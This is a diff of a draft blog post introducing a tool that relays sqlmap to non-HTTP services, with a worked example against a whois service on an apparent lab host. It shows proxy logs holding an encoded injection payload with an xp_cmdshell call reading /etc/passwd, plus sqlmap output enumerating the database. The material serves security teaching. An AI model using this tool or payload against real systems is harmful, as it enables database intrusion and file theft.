@@ -1,5 +1,5 @@
 ---
-title: SQLMAP proxy to shell tools or non-HTTP services.
+title: Introducing SQLMAP into non-HTTP services.
 published: false
 ---
 
@@ -16,17 +16,24 @@ You should already know that it can automate the SQL injection attack using requ
 - sqlmap 1.3.9#stable
 - python 3.7
 
-## 
+## Tool:
+
+https://github.com/haqpl/shiny-garbanzo
+
+
+## Working example:
+
+Below you can see an example usage of `shiny-garbanzo` and the corresponding output of SQLMAP, which identified and successfully exploited three different types of SQLi vulnerability in non-HTTP `whois` service.
 
 ```
-python3 whois_proxy.py --host '127.0.0.1' --tool "whois" --port 1337 --arguments="-h 10.10.10.155 SQLMAP"
+python3 shiny-garbanzo.py --host '127.0.0.1' --tool "whois" --port 1337 --arguments="-h 10.10.10.155 SQLMAP"
 [i] Starting server on 1337 PORT
-Start with this:
-sqlmap -u "127.0.0.1:1337" --data "cmd=" -p "cmd" --method POST
+[i] Start with this:
+[+] sqlmap -u "127.0.0.1:1337" --data "cmd=" -p "cmd" --method POST
 127.0.0.1 - - [23/Oct/2019 18:20:17] "POST / HTTP/1.1" 200 -
 127.0.0.1 - - [23/Oct/2019 18:20:17] "POST /?lgda=9167%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 -
 127.0.0.1 - - [23/Oct/2019 18:20:17] "POST / HTTP/1.1" 200 -
-
+...
 ```
 
 ```
@@ -117,93 +124,9 @@ Database: information_schema
 [77 tables]
 ...
 
-[18:20:45] [INFO] fetched data logged to text files under '/root/.sqlmap/output/127.0.0.1'
+[18:20:45] [INFO] fetched data logged to text files under './output/127.0.0.1'
 
 [*] ending @ 18:20:45 /2019-10-23/
 
 ```
 
-#### [](#header-4)Header 4
-
-*   This is an unordered list following a header.
-*   This is an unordered list following a header.
-*   This is an unordered list following a header.
-
-##### [](#header-5)Header 5
-
-1.  This is an ordered list following a header.
-2.  This is an ordered list following a header.
-3.  This is an ordered list following a header.
-
-###### [](#header-6)Header 6
-
-| head1        | head two          | three |
-|:-------------|:------------------|:------|
-| ok           | good swedish fish | nice  |
-| out of stock | good and plenty   | nice  |
-| ok           | good `oreos`      | hmm   |
-| ok           | good `zoute` drop | yumm  |
-
-### There's a horizontal rule below this.
-
-* * *
-
-### Here is an unordered list:
-
-*   Item foo
-*   Item bar
-*   Item baz
-*   Item zip
-
-### And an ordered list:
-
-1.  Item one
-1.  Item two
-1.  Item three
-1.  Item four
-
-### And a nested list:
-
-- level 1 item
-  - level 2 item
-  - level 2 item
-    - level 3 item
-    - level 3 item
-- level 1 item
-  - level 2 item
-  - level 2 item
-  - level 2 item
-- level 1 item
-  - level 2 item
-  - level 2 item
-- level 1 item
-
-### Small image
-
-![](https://assets-cdn.github.com/images/icons/emoji/octocat.png)
-
-### Large image
-
-![](https://guides.github.com/activities/hello-world/branching.png)
-
-
-### Definition lists can be used with HTML syntax.
-
-<dl>
-<dt>Name</dt>
-<dd>Godzilla</dd>
-<dt>Born</dt>
-<dd>1952</dd>
-<dt>Birthplace</dt>
-<dd>Japan</dd>
-<dt>Color</dt>
-<dd>Green</dd>
-</dl>
-
-```
-Long, single-line code blocks should not wrap. They should horizontally scroll if they are too long. This line should be long enough to demonstrate this.
-```
-
-```
-The final element.
-```
